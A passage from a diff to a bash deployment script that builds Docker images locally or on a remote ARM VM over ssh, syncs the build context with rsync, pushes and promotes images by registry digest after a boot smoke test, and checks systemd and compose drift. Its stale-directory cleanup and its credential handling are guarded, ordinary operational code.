+  prepare_build_identity || fail "Could not prepare complete build source identity"
+  target_args="$(_build_target_args)"
+  log "Building ${IMAGE_BASE}:${tag} + :${sha:0:8} (${PLATFORM}, GIT_COMMIT_SHA=${sha:0:8}${ACX_BUILD_TARGET:+, target=${ACX_BUILD_TARGET}})"
+  cd "${SERVICE_DIR}"
+  # shellcheck disable=SC2086 # target_args is intentionally word-split (empty or "--target X")
+  docker build \
+    --platform "${PLATFORM}" \
+    --build-arg "GIT_COMMIT_SHA=${sha}" \
+    --build-arg "SOURCE_TREE=${ACX_SOURCE_TREE}" \
+    --build-arg "BUILD_CONTEXT_MANIFEST_SHA256=${ACX_BUILD_CONTEXT_MANIFEST_SHA256}" \
+    --build-arg "SERVICE_LOCK_SHA256=${ACX_SERVICE_LOCK_SHA256}" \
+    --build-arg "BUILD_TIME=${ACX_BUILD_TIME}" \
+    --build-arg "SOURCE_INPUTS_JSON=${ACX_SOURCE_INPUTS_JSON}" \
+    ${target_args} \
+    -t "${IMAGE_BASE}:${tag}" \
+    -t "${IMAGE_BASE}:${sha}" \
+    . || return $?
+  log "Built ${IMAGE_BASE}:${tag} (also tagged :${sha:0:8})"
+}
+
+do_build_remote() {
+  local sha tag build_root build_dir build_timeout command_timeout build_rc=0 rsync_rc=0
+  local remote_build_started remote_build_timeout
+  local free_space_timeout mkdir_timeout rsync_timeout remaining generation_ttl
+  local generation_parent generation_basename generation_glob reap_timeout reap_command
+  local remote_program remote_command remote_arg
+  build_timeout="$(validated_deadline ACX_REMOTE_BUILD_TIMEOUT 1800)"
+  if ((build_timeout > REMOTE_BUILD_TIMEOUT_CEILING)); then
+    fail "ACX_REMOTE_BUILD_TIMEOUT=${build_timeout}s exceeds the ${REMOTE_BUILD_TIMEOUT_CEILING}s ceiling; stale-generation reaping relies on no build outliving it"
+  fi
+  preflight_ssh
+  preflight_remote_docker
+  preflight_rsync
+  pin_deploy_sha
+  sha="${DEPLOY_SHA}"
+  prepare_build_identity || fail "Could not prepare complete remote build source identity"
+  tag="${1:-dev}"
+  assert_safe_shell_token "image tag" "${tag}"
+  assert_safe_image_repo "IMAGE_BASE" "${IMAGE_BASE}"
+  command_timeout="$(validated_deadline ACX_REMOTE_COMMAND_TIMEOUT 120)"
+  remote_build_started="${SECONDS}"
+  remote_build_timeout="${build_timeout}"
+  # A unique generation directory prevents one coordinator's --delete rsync
+  # from rewriting another coordinator's source tree. flock additionally
+  # serializes builder setup, bootstrap, prune, and the resource-heavy BuildKit
+  # phase on the production-serving VM.
+  build_root="$(remote_build_root)"
+  build_dir="${build_root}-${sha:0:12}-$(date +%s)-${BASHPID:-$$}-${RANDOM}"
+  assert_safe_shell_token "remote generation build directory" "${build_dir}"
+
+  generation_ttl="${ACX_REMOTE_BUILD_GENERATION_TTL_MINUTES:-360}"
+  if [[ ! "${generation_ttl}" =~ ^[1-9][0-9]*$ ]]; then
+    warn "ACX_REMOTE_BUILD_GENERATION_TTL_MINUTES must be a positive integer (got: ${generation_ttl}); skipping stale generation reap"
+  elif ((generation_ttl * 60 <= 2 * REMOTE_BUILD_TIMEOUT_CEILING)); then
+    warn "ACX_REMOTE_BUILD_GENERATION_TTL_MINUTES=${generation_ttl} is not above twice the ${REMOTE_BUILD_TIMEOUT_CEILING}s build ceiling; skipping stale generation reap so a live build is never deleted"
+  else
+    generation_parent="${build_root%/*}"
+    generation_basename="${build_root##*/}"
+    if [[ -z "${build_root}" || "${build_root}" == "/" ||
+      -z "${generation_basename}" || "${generation_basename}" == "." || "${generation_basename}" == ".." ]]; then
+      warn "REMOTE_BUILD_DIR (${REMOTE_BUILD_DIR}) has no usable basename; skipping stale generation reap"
+    else
+      if [[ "${generation_parent}" == "${build_root}" ]]; then
+        generation_parent="."
+      elif [[ -z "${generation_parent}" ]]; then
+        generation_parent="/"
+      fi
+      if reap_timeout="$(remote_build_phase_timeout "stale generation reap" "${command_timeout}")"; then
+        generation_glob="$(remote_quote "${generation_basename}")-[0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]-[0-9]*-[0-9]*-[0-9]*"
+        reap_command="find '$(remote_quote "${generation_parent}")' -mindepth 1 -maxdepth 1 -type d -name '${generation_glob}' -mmin +$(remote_quote "${generation_ttl}") -exec rm -rf -- {} +"
+        if run_with_deadline "${reap_timeout}" "stale generation reap" \
+          ssh -l "${OCI_USER}" -- "${OCI_HOST}" "${reap_command}"; then
+          log "Reaped remote build generations older than ${generation_ttl}m under ${generation_parent}"
+        else
+          warn "Could not reap remote build generations older than ${generation_ttl}m under ${generation_parent}; build continues"
+        fi
+      else
+        warn "Skipping stale remote build generation reap; remote build budget exhausted"
+      fi
+    fi
+  fi
+
+  # All pre-build remote calls consume the same ACX_REMOTE_BUILD_TIMEOUT
+  # budget; command_timeout is only a per-call cap for lightweight setup.
+  if ! free_space_timeout="$(remote_build_phase_timeout "remote docker free-space probe" "${command_timeout}")"; then
+    fail "Remote build budget exhausted before the free-space probe"
+  fi
+  assert_remote_build_free_space "${free_space_timeout}"
+
+  log "Syncing build context ${SERVICE_DIR}/ -> ${SSH_TARGET}:${build_dir}/"
+  # D1: REMOTE_BUILD_DIR is charset-validated at ingestion; still single-quote at the sink so a
+  # future allowlist slip cannot unquote into remote argv (same blast radius as ACX_BUILD_TARGET).
+  if ! mkdir_timeout="$(remote_build_phase_timeout "remote generation directory creation" "${command_timeout}")"; then
+    fail "Remote build budget exhausted before generation directory creation"
+  fi
+  install_deploy_interrupt_traps
+  ACX_REMOTE_BUILD_GENERATION_DIR="${build_dir}"
+  run_with_deadline "${mkdir_timeout}" "remote generation directory creation" \
+    ssh -l "${OCI_USER}" -- "${OCI_HOST}" "mkdir -p -- '$(remote_quote "${build_dir}")'" ||
+    build_rc=$?
+  if ((build_rc != 0)); then
+    remote_build_cleanup_generation "${build_dir}" "${command_timeout}"
+    return "${build_rc}"
+  fi
+  # Weight-artifact excludes must stay in lockstep with apps/prototype-description-service/.dockerignore
+  # (see test_dockerignore_weight_exclusions.py). This list does NOT read .dockerignore.
+  #
+  # WHY (rsync glob-depth rule — do NOT "fix" by adding **/):
+  #   rsync: a pattern with no `/` (except an optional trailing `/` for "directory only")
+  #   matches the basename at every depth. `models--*/` therefore excludes both a top-level
+  #   models--Qwen.../ and one ten levels down. Prefixing `**/` injects a slash and switches
+  #   the rule to full-path matching; that is the opposite of Docker .dockerignore, where
+  #   `*.bin` is root-anchored and `**/*.bin` is the recursive form. Never add `**/` here.
+  if rsync_timeout="$(remote_build_phase_timeout "remote build-context rsync" "${build_timeout}")"; then
+    # The reaper reads generation age from the root's mtime.
+    run_with_deadline "${rsync_timeout}" "remote build-context rsync" rsync -az --delete --omit-dir-times \
+      --exclude='.git/' \
+      --exclude='__pycache__/' \
+      --exclude='*.pyc' \
+      --exclude='.pytest_cache/' \
+      --exclude='.mypy_cache/' \
+      --exclude='.ruff_cache/' \
+      --exclude='.venv/' \
+      --exclude='*.egg-info/' \
+      --exclude='build/' \
+      --exclude='dist/' \
+      --exclude='data/' \
+      --exclude='logs/' \
+      --exclude='node_modules/' \
+      --exclude='recognition/infrastructure/face_pipeline/models/*.onnx' \
+      --exclude='*.safetensors' \
+      --exclude='*.bin' \
+      --exclude='*.pt' \
+      --exclude='*.pth' \
+      --exclude='*.gguf' \
+      --exclude='*.msgpack' \
+      --exclude='models--*/' \
+      "${SERVICE_DIR}/" "${SSH_TARGET}:${build_dir}/" || rsync_rc=$?
+  else
+    rsync_rc=1
+  fi
+  if ((rsync_rc != 0)); then
+    remote_build_cleanup_generation "${build_dir}" "${command_timeout}"
+    return "${rsync_rc}"
+  fi
+
+  log "Building ${IMAGE_BASE}:${sha} on ${SSH_TARGET} for ${tag} (native arm64${ACX_BUILD_TARGET:+, target=${ACX_BUILD_TARGET}})"
+  # No --platform: VM is already linux/arm64 (Ampere A1).
+  # The generated program performs builder setup, bootstrap, verification,
+  # prune, and build beneath one shared lock. Its stdin is the program itself;
+  # run_with_deadline preserves that stdin while it backgrounds ssh.
+  remote_program="$(bounded_remote_build_program)"
+  if ! remaining="$(remote_build_remaining "remote BuildKit setup/bootstrap/prune/build")"; then
+    remote_build_cleanup_generation "${build_dir}" "${command_timeout}"
+    fail "Remote build budget exhausted before the locked BuildKit phase"
+  fi
+  # Establish the absolute deadline on the VM immediately before lock wait so
+  # local/remote clock skew cannot make the inner watchdog either too short or
+  # longer than the remaining local budget.
+  remote_command="command -v flock >/dev/null 2>&1 && acx_deadline_epoch=\$(date +%s) && acx_deadline_epoch=\$((acx_deadline_epoch + ${remaining})) && flock -w ${remaining} $(remote_quote "${REMOTE_BUILD_LOCK}") bash -s --"
+  for remote_arg in "${REMOTE_BUILDER_NAME}" "${REMOTE_BUILDER_NODE}" "${REMOTE_BUILDER_ENDPOINT}" \
+    "${IMAGE_BASE}" "${sha}" "${ACX_BUILD_TARGET}"; do
+    remote_command+=" $(remote_quote "${remote_arg}")"
+  done
+  remote_command+=' "$acx_deadline_epoch"'
+  for remote_arg in "${build_dir}" "${ACX_SOURCE_TREE}" "${ACX_BUILD_CONTEXT_MANIFEST_SHA256}" \
+    "${ACX_SERVICE_LOCK_SHA256}" "${ACX_BUILD_TIME}" "${ACX_SOURCE_INPUTS_JSON}"; do
+    remote_command+=" $(remote_quote "${remote_arg}")"
+  done
+  run_with_deadline "${remaining}" "remote BuildKit setup/bootstrap/prune/build for ${sha:0:12}" \
+    ssh -l "${OCI_USER}" -- "${OCI_HOST}" "${remote_command}" \
+    <<<"${remote_program}" || build_rc=$?
+  remote_build_cleanup_generation "${build_dir}" "${command_timeout}"
+  ((build_rc == 0)) || return "${build_rc}"
+  log "Built ${IMAGE_BASE}:${sha} on ${SSH_TARGET}; environment tag awaits promotion"
+}
+
+#---------------------------------------------------------------- push / restart
+# Run a command with a portable outer wall-clock deadline.  This intentionally
+# does not rely on GNU timeout(1), which is absent on a stock macOS workstation.
+terminate_process_tree() {
+  local root_pid="$1" signal_name="$2" child_pid
+  while read -r child_pid; do
+    [[ -n "${child_pid}" ]] || continue
+    terminate_process_tree "${child_pid}" "${signal_name}"
+  done < <(ps -eo pid=,ppid= | awk -v parent="${root_pid}" '$2 == parent { print $1 }')
+  kill -s "${signal_name}" "${root_pid}" 2>/dev/null || true
+}
+
+run_with_deadline() {
+  local deadline="$1" label="$2" pid rc owner_pid current_parent process_state started_at
+  # BASHPID is bash 4.0+; macOS operators run this from /bin/bash 3.2. A child
+  # that execs sh reports the forking shell as its PPID, which is this shell.
+  owner_pid="${BASHPID:-$(exec sh -c 'echo $PPID')}"
+  shift 2
+  # A job backgrounded by a non-interactive shell inherits /dev/null on stdin,
+  # which silently swallows any heredoc/here-string the caller attached — e.g.
+  # do_boot_smoke's SMOKE script piped to `ssh ... bash -s`, where an empty stdin
+  # makes the remote shell exit 0 without running a single gate (fail-open smoke).
+  # WHY `<&0`: without job control a bare `cmd &` gets /dev/null as stdin, which
+  # would starve callers that attach a heredoc (do_boot_smoke's `ssh ... bash -s`).
+  # Do NOT reintroduce `exec 3<&0; cmd <&3 &; exec 3<&-`: bash 5.2 segfaults
+  # (rc 139, no diagnostic) on that dup/close pair inside a command substitution
+  # when the program arrives over `bash -s` — the shape capture_failure_evidence
+  # uses for every `evidence="$(run_with_deadline ...)"` probe.
+  "$@" <&0 &
+  pid=$!
+  started_at="${SECONDS}"
+  while kill -0 "${pid}" 2>/dev/null; do
+    # kill -0 also succeeds for an exited-but-unreaped zombie. Detect that
+    # state so every healthy integration does not pay a one-second poll tax.
+    process_state="$(ps -o stat= -p "${pid}" 2>/dev/null | tr -d ' ' || true)"
+    if [[ -z "${process_state}" || "${process_state}" == Z* ]]; then
+      break
+    fi
+    if ((SECONDS - started_at >= deadline)); then
+      terminate_process_tree "${pid}" TERM
+      sleep 1
+      current_parent="$(ps -o ppid= -p "${pid}" 2>/dev/null | tr -d ' ' || true)"
+      if [[ "${current_parent}" == "${owner_pid}" ]]; then
+        terminate_process_tree "${pid}" KILL
+      fi
+      wait "${pid}" 2>/dev/null || true
+      warn "${label} timed out after ${deadline}s; outcome UNKNOWN. Inspect the target state before retrying."
+      return 124
+    fi
+    sleep 0.1
+  done
+  wait "${pid}" || {
+    rc=$?
+    return "${rc}"
+  }
+}
+
+validated_deadline() {
+  local name="$1" default_value="$2" value
+  value="${!name:-${default_value}}"
+  if [[ ! "${value}" =~ ^[1-9][0-9]*$ ]]; then
+    fail "${name} must be a positive integer (got: ${value})"
+  fi
+  printf '%s\n' "${value}"
+}
+
+# Keep the credential-store path out of unrelated children (git, ssh, rsync,
+# build tooling). Only registry-facing local Docker commands receive it.
+local_docker_with_config() {
+  if [[ -n "${ACX_EDGE_HANDLE:-}" ]]; then recognition_edge_assert_if_active || return 75; fi
+  DOCKER_CONFIG="${ACX_DEPLOY_OCIR_CONFIG_DIR}" \
+    ACX_OCIR_DOCKER_CONFIG_DIR="${ACX_DEPLOY_OCIR_CONFIG_DIR}" \
+    docker "$@"
+}
+
+remote_docker_with_config() {
+  if [[ -n "${ACX_EDGE_HANDLE:-}" ]]; then recognition_edge_assert_if_active || return 75; fi
+  local config_q arg quoted_args="" remote_dir=""
+  # An uninitialized config keeps DOCKER_CONFIG empty (docker's default), never a bare /tmp/.
+  if [[ -n "${ACX_DEPLOY_OCIR_CONFIG_DIR}" ]]; then
+    remote_dir="$(remote_ocir_config_dir)" || fail "Remote OCIR credential dir is not initialized"
+  fi
+  config_q="$(remote_quote "${remote_dir}")"
+  for arg in "$@"; do
+    quoted_args+=" $(remote_quote "${arg}")"
+  done
+  ssh -o BatchMode=yes -o ConnectTimeout=10 -o ConnectionAttempts=1 \
+    -o ServerAliveInterval=15 -o ServerAliveCountMax=3 \
+    -l "${OCI_USER}" -- "${OCI_HOST}" \
+    "DOCKER_CONFIG=${config_q} exec docker${quoted_args}"
+}
+
+# Push a single fully-qualified image ref, honoring local vs remote-build mode.
+_push_ref() {
+  local ref="$1" timeout rc=0
+  assert_safe_image_repo "push image ref" "${ref}"
+  timeout="${ACX_PUSH_TIMEOUT:-900}"
+  if [[ ! "${timeout}" =~ ^[1-9][0-9]*$ ]]; then
+    fail "ACX_PUSH_TIMEOUT must be a positive integer (got: ${timeout})"
+  fi
+  if [[ "${REMOTE_BUILD}" == "1" ]]; then
+    run_with_deadline "${timeout}" "push of ${ref}" remote_docker_with_config push "${ref}" || rc=$?
+  else
+    run_with_deadline "${timeout}" "push of ${ref}" local_docker_with_config push "${ref}" || rc=$?
+  fi
+  return "${rc}"
+}
+
+# Pull one fully-qualified image ref with the same wall-clock bound as pushes.
+# The build-host variant follows REMOTE_BUILD; the remote-only variant is used
+# for smoke/restart/rollback, which always materialise bytes on the target VM.
+_pull_ref() {
+  local ref="$1" timeout rc=0
+  assert_safe_image_ref "pull image ref" "${ref}"
+  timeout="${ACX_PULL_TIMEOUT:-900}"
+  if [[ ! "${timeout}" =~ ^[1-9][0-9]*$ ]]; then
+    fail "ACX_PULL_TIMEOUT must be a positive integer (got: ${timeout})"
+  fi
+  if [[ "${REMOTE_BUILD}" == "1" ]]; then
+    run_with_deadline "${timeout}" "pull of ${ref}" remote_docker_with_config pull "${ref}" || rc=$?
+  else
+    run_with_deadline "${timeout}" "pull of ${ref}" local_docker_with_config pull "${ref}" || rc=$?
+  fi
+  return "${rc}"
+}
+
+_pull_ref_remote() {
+  local ref="$1" timeout rc=0
+  assert_safe_image_ref "remote pull image ref" "${ref}"
+  timeout="${ACX_PULL_TIMEOUT:-900}"
+  if [[ ! "${timeout}" =~ ^[1-9][0-9]*$ ]]; then
+    fail "ACX_PULL_TIMEOUT must be a positive integer (got: ${timeout})"
+  fi
+  run_with_deadline "${timeout}" "remote pull of ${ref}" remote_docker_with_config pull "${ref}" || rc=$?
+  return "${rc}"
+}
+
+# Read the registry digest recorded on the just-pushed local/remote image.
+image_digest_ref() {
+  local ref="$1" output digest_ref timeout rc=0
+  timeout="$(validated_deadline ACX_REMOTE_INSPECT_TIMEOUT 60)"
+  if [[ "${REMOTE_BUILD}" == "1" ]]; then
+    output="$(run_with_deadline "${timeout}" "remote image digest inspection for ${ref}" \
+      remote_docker_with_config image inspect --format '{{range .RepoDigests}}{{println .}}{{end}}' "${ref}")" || rc=$?
+  else
+    output="$(run_with_deadline "${timeout}" "local image digest inspection for ${ref}" \
+      local_docker_with_config image inspect --format '{{range .RepoDigests}}{{println .}}{{end}}' "${ref}")" || rc=$?
+  fi
+  ((rc == 0)) || return "${rc}"
+  digest_ref="$(printf '%s\n' "${output}" | awk -v repo="${IMAGE_BASE}@sha256:" 'index($0, repo) == 1 { print; exit }')"
+  if [[ ! "${digest_ref}" =~ ^[A-Za-z0-9_.:/-]+@sha256:[a-f0-9]{64}$ ]]; then
+    warn "Could not resolve a sha256 registry digest for ${ref} (got: ${digest_ref:-empty})"
+    return 1
+  fi
+  printf '%s\n' "${digest_ref}"
+}
+
+remote_image_digest_ref() {
+  local ref="$1" output digest_ref timeout rc=0 repo
+  timeout="$(validated_deadline ACX_REMOTE_INSPECT_TIMEOUT 60)"
+  output="$(run_with_deadline "${timeout}" "remote image digest inspection for ${ref}" \
+    remote_docker_with_config image inspect --format '{{range .RepoDigests}}{{println .}}{{end}}' "${ref}")" || rc=$?
+  ((rc == 0)) || return "${rc}"
+  if [[ "${ref}" == *@sha256:* ]]; then
+    repo="${ref%@sha256:*}"
+  elif [[ "${ref##*/}" == *:* ]]; then
+    repo="${ref%:*}"
+  else
+    repo="${ref}"
+  fi
+  digest_ref="$(printf '%s\n' "${output}" | awk -v repo="${repo}@sha256:" 'index($0, repo) == 1 { print; exit }')"
+  if [[ ! "${digest_ref}" =~ ^[A-Za-z0-9_.:/-]+@sha256:[a-f0-9]{64}$ ]]; then
+    warn "Could not resolve a remote sha256 registry digest for ${ref} (got: ${digest_ref:-empty})"
+    return 1
+  fi
+  printf '%s\n' "${digest_ref}"
+}
+
+remote_image_id_for_digest() {
+  local digest_ref="$1" timeout image_id rc=0
+  timeout="$(validated_deadline ACX_REMOTE_INSPECT_TIMEOUT 60)"
+  image_id="$(run_with_deadline "${timeout}" "remote immutable image ID inspection for ${digest_ref}" \
+    remote_docker_with_config image inspect --format '{{.Id}}' "${digest_ref}")" || rc=$?
+  if ((rc != 0)) || [[ ! "${image_id}" =~ ^sha256:[a-f0-9]{64}$ ]]; then
+    return 1
+  fi
+  printf '%s\n' "${image_id}"
+}
+
+extract_image_commit_sha() {
+  local output="$1" commit_sha
+  commit_sha="$(printf '%s\n' "${output}" | awk 'index($0, "APP_GIT_COMMIT_SHA=") == 1 { value = substr($0, 20) } END { print value }')"
+  if [[ ! "${commit_sha}" =~ ^[a-f0-9]{40}$ ]]; then
+    return 1
+  fi
+  printf '%s\n' "${commit_sha}"
+}
+
+remote_image_commit_sha() {
+  local digest_ref="$1" timeout output rc=0
+  if [[ ! "${digest_ref}" =~ ^[A-Za-z0-9_.:/-]+@sha256:[a-f0-9]{64}$ ]]; then
+    return 1
+  fi
+  timeout="$(validated_deadline ACX_REMOTE_INSPECT_TIMEOUT 60)"
+  output="$(run_with_deadline "${timeout}" "remote image commit SHA inspection for ${digest_ref}" \
+    remote_docker_with_config image inspect --format '{{range .Config.Env}}{{println .}}{{end}}' "${digest_ref}")" || rc=$?
+  ((rc == 0)) || return 1
+  extract_image_commit_sha "${output}"
+}
+
+image_commit_sha() {
+  local digest_ref="$1" timeout output rc=0
+  if [[ ! "${digest_ref}" =~ ^[A-Za-z0-9_.:/-]+@sha256:[a-f0-9]{64}$ ]]; then
+    return 1
+  fi
+  if [[ "${REMOTE_BUILD}" == "1" ]]; then
+    remote_image_commit_sha "${digest_ref}"
+    return $?
+  fi
+  timeout="$(validated_deadline ACX_REMOTE_INSPECT_TIMEOUT 60)"
+  output="$(run_with_deadline "${timeout}" "local image commit SHA inspection for ${digest_ref}" \
+    local_docker_with_config image inspect --format '{{range .Config.Env}}{{println .}}{{end}}' "${digest_ref}")" || rc=$?
+  ((rc == 0)) || return 1
+  extract_image_commit_sha "${output}"
+}
+
+# A local RepoDigests entry describes a cached image object, not necessarily the
+# registry's current mutable-tag mapping. Pull the tag after the push and only
+# then inspect what the registry returned (read-after-write evidence).
+registry_tag_digest_ref() {
+  local ref="$1"
+  _pull_ref "${ref}" >/dev/null || return
+  image_digest_ref "${ref}"
+}
+
+# Push the SHA-named tag, then capture its content digest.  The tag remains
+# mutable; only ACX_CANDIDATE_DIGEST_REF is used by smoke and promotion.
+do_push_sha() {
+  local sha
+  pin_deploy_sha
+  sha="${DEPLOY_SHA}"
+  if [[ "${REMOTE_BUILD}" == "1" ]]; then preflight_remote_ocir_auth; else preflight_ocir_auth; fi
+  log "Pushing ${IMAGE_BASE}:${sha:0:8}"
+  _push_ref "${IMAGE_BASE}:${sha}"
+  ACX_CANDIDATE_DIGEST_REF="$(image_digest_ref "${IMAGE_BASE}:${sha}")" ||
+    fail "SHA-named tag was pushed but its registry digest could not be captured"
+  log "Candidate digest fence: ${ACX_CANDIDATE_DIGEST_REF}"
+}
+
+# Promote the env tag (e.g. :latest for prod). Called ONLY after the boot smoke
+# passes, so a bad image never poisons the env tag in OCIR.
+do_push_tag() {
+  local tag source_digest promoted_digest
+  if [[ "${1:-}" == "--locked" ]]; then
+    shift
+  else
+    tag="$1"
+    source_digest="${2:-${ACX_CANDIDATE_DIGEST_REF:-}}"
+    assert_safe_shell_token "image tag" "${tag}"
+    with_shared_tag_lock "${tag}" do_push_tag --locked "${tag}" "${source_digest}"
+    return
+  fi
+  tag="$1"
+  source_digest="${2:-${ACX_CANDIDATE_DIGEST_REF:-}}"
+  assert_safe_shell_token "image tag" "${tag}"
+  assert_safe_image_repo "IMAGE_BASE" "${IMAGE_BASE}"
+  if [[ ! "${source_digest}" =~ ^${IMAGE_BASE}@sha256:[a-f0-9]{64}$ ]]; then
+    warn "refusing tag promotion without a valid candidate digest: ${source_digest:-empty}"
+    return 1
+  fi
+  log "Promoting ${source_digest} -> ${IMAGE_BASE}:${tag} in OCIR"
+  _pull_ref "${source_digest}" || return
+  if [[ "${REMOTE_BUILD}" == "1" ]]; then
+    remote_docker_with_config tag "${source_digest}" "${IMAGE_BASE}:${tag}" || return
+  else
+    local_docker_with_config tag "${source_digest}" "${IMAGE_BASE}:${tag}" || return
+  fi
+  if ! _push_ref "${IMAGE_BASE}:${tag}"; then
+    warn "push of ${IMAGE_BASE}:${tag} failed"
+    return 1
+  fi
+  promoted_digest="$(registry_tag_digest_ref "${IMAGE_BASE}:${tag}")" || return
+  if [[ "${promoted_digest}" != "${source_digest}" ]]; then
+    warn "DIGEST MISMATCH: smoke fenced ${source_digest}, but promotion resolved ${promoted_digest}"
+    return 1
+  fi
+}
+
+# Shared pre-restart safety gate for <env> on candidate digest: boot-smoke the
+# candidate (abort on failure), ship ACX_IMAGE_REPO
+# into remote .env (before any env-tag promotion), converge compose+unit.
+# Used by both do_deploy and do_promote so the prod path is uniform.
+promote_gate() {
+  local env="$1" image="$2" remote_dir ship_status=0 claim_status=0
+  remote_dir="$(env_to_remote_dir "$env")" || return 1
+  if [[ ! "${image}" =~ ^${IMAGE_BASE}@sha256:[a-f0-9]{64}$ ]]; then
+    fail "promote gate requires a digest-pinned candidate (got: ${image})"
+  fi
+  if [[ "${ACX_BOOT_SMOKE:-1}" == "1" ]]; then
+    if ! do_boot_smoke "$env" "$image"; then
+      fail "Pre-promote boot smoke failed for ${env} (${image}); prod left on the old image (no restart). Fix the build and re-run, or set ACX_BOOT_SMOKE=0 to bypass."
+    fi
+  else
+    warn "ACX_BOOT_SMOKE=0: skipping pre-promote boot smoke"
+  fi
+
+  recognition_edge_begin "$env" || return $?
+
+  # Claim and capture prior state together on the target before any sticky write.
+  ACX_PRIOR_IMAGE_REPO_ENV="$env"
+  ACX_DEPLOY_PHASE=repo_shipped
+  if ACX_IMAGE_REPO_OWNER_ID="$(image_repo_resource claim "${remote_dir}" "" "")"; then
+    :
+  else
+    claim_status=$?
+    if ((claim_status == 75)); then
+      ACX_DEPLOY_PHASE=""
+    fi
+    return "${claim_status}"
+  fi
+  ship_remote_image_repo_env "${remote_dir}" || ship_status=$?
+  if ((ship_status != 0)); then
+    if ((ship_status != 75)); then
+      restore_prior_image_repo_env || warn "prior sticky repository restore failed"
+    fi
+    ACX_DEPLOY_PHASE=""
+    return "${ship_status}"
+  fi
+
+  if [[ "${ACX_CONVERGE_RUNTIME:-1}" == "1" ]]; then
+    # converge_runtime contains fail-fast exits. Run it in a subshell so a
+    # failure returns control to this transaction boundary and the sticky repo
+    # can be compensated before the deploy exits.
+    if ! (converge_runtime "$env"); then
+      warn "Runtime convergence failed for ${env}; restoring the prior topology and sticky repository"
+      local restore_status=0
+      restore_runtime_topology "$env" || restore_status=$?
+      recognition_edge_assert_if_active || return 75
+      restore_prior_image_repo_env || return $?
+      ((restore_status == 0)) || {
+        warn "topology restore failed for ${env}; journal retained"
+        return "$restore_status"
+      }
+      ACX_DEPLOY_PHASE=""
+      return 1
+    fi
+  else
+    # HARM-A-06: image-only hotfix must not land on a compose/unit topology that
+    # differs from the repo (Gate 2 smokes the NEW topology; stale VM compose would
+    # not receive those mounts). Refuse ACX_CONVERGE_RUNTIME=0 when drift exists.
+    if ! runtime_in_sync "$env"; then
+      warn "ACX_CONVERGE_RUNTIME=0 refused for ${env}: deployed compose/unit drifts from repo"
+      restore_prior_image_repo_env
+      ACX_DEPLOY_PHASE=""
+      return 1
+    fi
+    warn "ACX_CONVERGE_RUNTIME=0: skipping compose+unit convergence (image-only restart; topology matches repo)"
+  fi
+}
+
+# Restore sticky ACX_IMAGE_REPO after a post-ship failure (S2-A-06). Empty prior
+# means the key was absent — clear it rather than leave the newly shipped value.
+restore_prior_image_repo_env() {
+  local env="${ACX_PRIOR_IMAGE_REPO_ENV:-}"
+  [[ -n "${env}" ]] || return 0
+  recognition_edge_assert_if_active || return 75
+  image_repo_resource restore "$(env_to_remote_dir "$env")" "${ACX_IMAGE_REPO_OWNER_ID:-}" ""
+}
+
+# Read-only topology match (same diffs as converge_check) but returns 1 on drift
+# instead of calling fail() — usable under ACX_CONVERGE_RUNTIME=0 refuse path.
+runtime_in_sync() {
+  local env="$1" remote_dir unit rendered timeout
+  timeout="$(validated_deadline ACX_REMOTE_COMMAND_TIMEOUT 120)"
+  remote_dir="$(env_to_remote_dir "$env")" || return 1
+  unit="$(env_to_unit "$env")" || return 1
+  if ! run_with_deadline "${timeout}" "runtime compose read for ${env}" \
+    ssh -o BatchMode=yes -o ConnectTimeout="${timeout}" -o ConnectionAttempts=1 \
+    -o ServerAliveInterval="${timeout}" -o ServerAliveCountMax=1 \
+    -l "${OCI_USER}" -- "${OCI_HOST}" "cat '${remote_dir}/docker-compose.env.yml' 2>/dev/null" |
+    diff -q - "${SERVICE_DIR}/docker-compose.env.yml" >/dev/null 2>&1; then
+    return 1
+  fi
+  if [[ "$env" == "prod" ]]; then
+    if ! run_with_deadline "${timeout}" "runtime admin compose read for ${env}" \
+      ssh -o BatchMode=yes -o ConnectTimeout="${timeout}" -o ConnectionAttempts=1 \
+      -o ServerAliveInterval="${timeout}" -o ServerAliveCountMax=1 \
+      -l "${OCI_USER}" -- "${OCI_HOST}" "cat '${remote_dir}/docker-compose.admin.yml' 2>/dev/null" |
+      diff -q - "${SERVICE_DIR}/docker-compose.admin.yml" >/dev/null 2>&1; then
+      return 1
+    fi
+  fi
+  rendered="$(render_unit "$env")" || return 1
+  if ! run_with_deadline "${timeout}" "runtime unit read for ${env}" \
+    ssh -o BatchMode=yes -o ConnectTimeout="${timeout}" -o ConnectionAttempts=1 \
+    -o ServerAliveInterval="${timeout}" -o ServerAliveCountMax=1 \
+    -l "${OCI_USER}" -- "${OCI_HOST}" "cat '/etc/systemd/system/${unit}.service' 2>/dev/null" |
+    diff -q - <(printf '%s\n' "$rendered") >/dev/null 2>&1; then
+    return 1
+  fi
+  return 0
+}
+
+env_to_compose_files() {
+  case "$1" in
+    prod) echo "-f docker-compose.env.yml -f docker-compose.admin.yml" ;;
+    dev | dev-fir | staging | dev-auraface | staging-auraface | prod-auraface) echo "-f docker-compose.env.yml" ;;
+    *) fail "Unknown env: $1" ;;
+  esac
+}
+
+# Render the systemd unit for <env> from the checked-in template to stdout.
+render_unit() {
+  local env="$1" compose_files secret_backend pre_start timeout
+  compose_files="$(env_to_compose_files "$env")" || return 1
+  if (($# >= 2)); then
+    secret_backend="$2"
+  else
+    timeout="$(validated_deadline ACX_REMOTE_COMMAND_TIMEOUT 120)" || return $?
+    secret_backend="$(_remote_dotenv_value "$(env_to_remote_dir "$env")" RECOGNITION_SECRET_BACKEND "${timeout}")" || return $?
+  fi
+  pre_start='# '
+  if [[ "$secret_backend" == "oci_vault" ]]; then
+    pre_start=''
+  fi
+  sed -e "s/{{ENV}}/${env}/g" -e "s|{{COMPOSE_FILES}}|${compose_files}|g" \
+    -e "s|^# ExecStartPre=|${pre_start}ExecStartPre=|" \
+    "${SERVICE_DIR}/systemd/acx-env.service.template" |
+    sed -E 's|^(ExecStop=.*) stop$|\1 stop api worker|'
+}
+
+install_rendered_unit() {
+  local env="$1" remote_dir unit secret_backend hook probe_rc=0 rendered
+  local timeout
+  recognition_edge_assert_if_active || return 75
+  timeout="$(validated_deadline ACX_REMOTE_COMMAND_TIMEOUT 120)" || return 1
+  remote_dir="$(env_to_remote_dir "$env")" || return 1
+  unit="$(env_to_unit "$env")" || return 1
+  secret_backend="$(_remote_dotenv_value "$remote_dir" RECOGNITION_SECRET_BACKEND "$timeout")" || return $?
+  if [[ "$secret_backend" == "oci_vault" ]]; then
